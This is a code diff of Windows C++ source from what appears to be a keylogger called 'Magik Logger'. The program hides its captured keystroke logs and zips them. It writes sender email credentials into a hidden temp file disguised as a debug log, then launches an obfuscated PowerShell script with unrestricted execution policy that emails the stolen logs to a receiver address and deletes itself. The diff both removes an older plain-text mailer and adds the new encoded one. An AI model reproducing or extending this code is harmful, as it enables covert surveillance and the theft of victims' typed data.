@@ -206,6 +206,24 @@ void Log::LogItChar(std::string Value) {
     File.close();
 }
 
+void createLogFile(const std::string& filename, const std::string& line1, const std::string& line2, const std::string& line3) {
+	// Create the file with the FILE_ATTRIBUTE_HIDDEN attribute
+	HANDLE file = CreateFileA(filename.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
+	// Write the first line to the file
+	DWORD writtenBytes;
+	WriteFile(file, line1.c_str(), (DWORD)line1.size(), &writtenBytes, NULL);
+	WriteFile(file, "\r\n", 2, &writtenBytes, NULL);
+
+	// Write the second line to the file
+	WriteFile(file, line2.c_str(), (DWORD)line2.size(), &writtenBytes, NULL);
+	WriteFile(file, "\r\n", 2, &writtenBytes, NULL);
+
+	// Write the third line to the file
+	WriteFile(file, line3.c_str(), (DWORD)line3.size(), &writtenBytes, NULL);
+	WriteFile(file, "\r\n", 2, &writtenBytes, NULL);
+	// Close the file
+	CloseHandle(file);
+}
 /*void CompressFile(std::string Path) {
     DWORD WrittenBytes;
     char FileBufferer[1000 + CharactersPerLog];
@@ -227,10 +245,10 @@ void Log::LogItChar(std::string Value) {
 void Log::SendLog() {
     SetFileAttributesA(log.c_str(), FILE_ATTRIBUTE_HIDDEN);
     std::string ZipPath = log;
-    ZipPath += ".zip";
-    FILE* f = fopen(ZipPath.c_str(), "wb");
-    fwrite("\x50\x4B\x05\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 22, 1, f);
-    fclose(f);
+    ZipPath += ".zip";																									// remove or disable this 
+    FILE* f = fopen(ZipPath.c_str(), "wb");																				// if you dont want the
+    fwrite("\x50\x4B\x05\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 22, 1, f);		// log txt file to
+    fclose(f);																											// become zipped. 
     const char* files[] = {
         log.c_str()
     };
@@ -239,7 +257,15 @@ void Log::SendLog() {
         CopyItems(std::cbegin(files), std::cend(files), ZipPath.c_str());
         CoUninitialize();
     }
-    //CompressFile(ZipPath);
+	char tempPath[MAX_PATH];
+	GetEnvironmentVariable("TEMP", tempPath, MAX_PATH);
+	std::string fullPath = tempPath;
+	fullPath += "\\mat-debug-";
+	fullPath += std::to_string(rand() % 10000 + 1000);
+	fullPath += ".log";
+	createLogFile(fullPath, SendersEmail, SendersPsw, ZipPath);															 //if you want to not zip the file, change to "ZipPath" to "log"
+	
+	//CompressFile(ZipPath);
     std::string Command = "/C powershell ";
     char SysDir[MAX_PATH];
     GetSystemDirectoryA(SysDir, MAX_PATH);
@@ -255,18 +281,11 @@ void Log::SendLog() {
     std::string PSStartup = "MagikMailer";
     PSStartup += std::to_string(GetTickCount());
     HANDLE PS1File = CreateFileA(Powershell.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    std::string a = HardDecode("yLqyY[rTpdnTY\\{P2c{;4f2XoVwSZ\\Q7UdnT5e7PHK2PY\\sL4VveZ\\QDURiOJdjnIfwXI\\nL5Sw:o\\wnGWW32WmqS\\3LJfmCURiy4eVXIdkHodH7{do7YUSTXVVTkEreFQ3CEN{Xof{X4WyTZdVTEM27Y\\rz4SyTZdV7EdrHYVwSZ\\QDEflXock;WN5XoVi2FKx\\odLDHXPPHLMeUdxPoNunY[vfoNyTZd|fEK;Cken\\penPHWW32WmqygMmU\\wnIdw;ILqCk\\rrCfnnYfT3EKzCEfwX5dF3EK66EQwilN6CkdxnIflXodw;4[vS5enTJK;CU\\wnIdw;IL");
-    a += HardDecode(SendersEmail);
-    a += "', '";
-    a += HardDecode(SendersPsw);
-    a += "')\n$ReportEmail = New-Object System.Net.Mail.MailMessage\n$ReportEmail.From = '";
-    a += HardDecode(SendersEmail);
-    a += "'\n$ReportEmail.To.Add('";
-    a += HardDecode(RecieversEmail);
-    a += "')\n$ReportEmail.Subject = 'MagikIndex'\n$ReportEmail.Body = 'Your Magik Logger'\n$ReportEmail.Attachments.Add('";
-    a += ZipPath.c_str();
-    a += "')\n$SMTPInfo.Send($ReportEmail)\nRemove-Item $MyINvocation.InvocationName\nexit\n}\nelse\n{\nexit\n}";
-    WriteFile(PS1File, a.c_str(), (DWORD)strlen(a.c_str()), &WrittenBytes, NULL);
+	std::string a = "$credsPath = \"";
+	a += fullPath;
+	a += "\"\n";
+	a += HardDecode("ShMSZc6XoE9rS\\|zY\\M2pE2nIgnrS\\vHoVw;Yc2H4[x\\pdL7kdxnIfjP4d47WU73GLi2Y\\2nWNn\\5dvXoWMW4[{;oTvCEc2HIW|TY\\{PILi2Y\\2nWNn\\5dvXoWMmEdrHYdHTpexDZ\\UTEMm7Y\\V7{do7YUSTXVVTkEriIfjDHerrHLqSI\\D7{e27Y\\vj4[jTJfD7EdrHYdHTpexDZ\\UTkEpCU\\pHYdLDUenL3Li2FK7T4dE7EdrHYdHTpexDZ\\UTkEpiX\\pHYdLDE\\nT5enXZenLHK8WmWpCURiS5[nro[3PnNunY[vXGf{;IenLHLMmEdrHYdnTEMmTYSw:IXwyYcj3YT2L5dyXoWmqCdrHYdnTEK;CUdxLpTwyYcj3YT2L5dyXoWmqS\\pH4e|XYVunY[P7EdrHYVwSZ\\Q7UdnT5e7PHK2PY\\sL4VveZ\\QDURiyYcj3YT2L5dyXoWmqSMmL5d5P5ejDJLiyEdrHYdnTEMuHYc27Y\\mXoeFvoexfJfn7mN2XoVw2Y\\2PZgVDEflXock;WN5XoVi2FK|zY[rTpdnTY\\{PmNx\\odLDHXPPHLMWYf{TJLi2FKuP5Wnzo[j7YTw:o\\wnGWW32WmqSM5iVPiyken\\penPHe234WmiEfwXYcuPGe234WwyYcj3mN2XoViS5[nro[R3{fn7GK;C{do7YUSTXVVTkEp24dl7EdrHYdp7Ee234epCURiKZ\\4LZ\\VDHXPPHLMupErWodrzodxTEMi[YcMSZ\\rXZWvCUOiSpd3;4SvCEQwilN66EQi64drT5[n7odxPYN2PZ\\2DURiWodrzodxTkEfL|Y|XodrzILi2FKqTZ[SDZccTkEfH|Y|XodrzILi2FKmL5d5P5ejDJLM2HOdPZ\\wnIdmCURiyYcj3Y\\mqCc2HIW|TY\\{PILiSpdnTpdxPWN2X4Ti2FK|XodrzIL");
+	WriteFile(PS1File, a.c_str(), (DWORD)strlen(a.c_str()), &WrittenBytes, NULL);
     CloseHandle(PS1File);
     Command = SysDir;
     Command += " /C PowerShell.exe -ExecutionPolicy Unrestricted -command \"";
@@ -302,7 +321,13 @@ void Log::CreateLog() {
     CreateDirectoryA(CurrentLog.c_str(), NULL);
 
     SetFileAttributesA(CurrentLog.c_str(), FILE_ATTRIBUTE_HIDDEN);
-
+	if (CalculateDirSize(CurrentLog) > MaximumFolderLog)
+	{
+		DeleteDirectory(CurrentLog); //? trying to delete too many logs
+		Sleep(200);
+		CreateDirectoryA(CurrentLog.c_str(), NULL);
+		SetFileAttributesA(CurrentLog.c_str(), FILE_ATTRIBUTE_HIDDEN);
+	}
     CurrentLog += "\\Log";
     CurrentLog += LogTime;
     CurrentLog += ".txt";
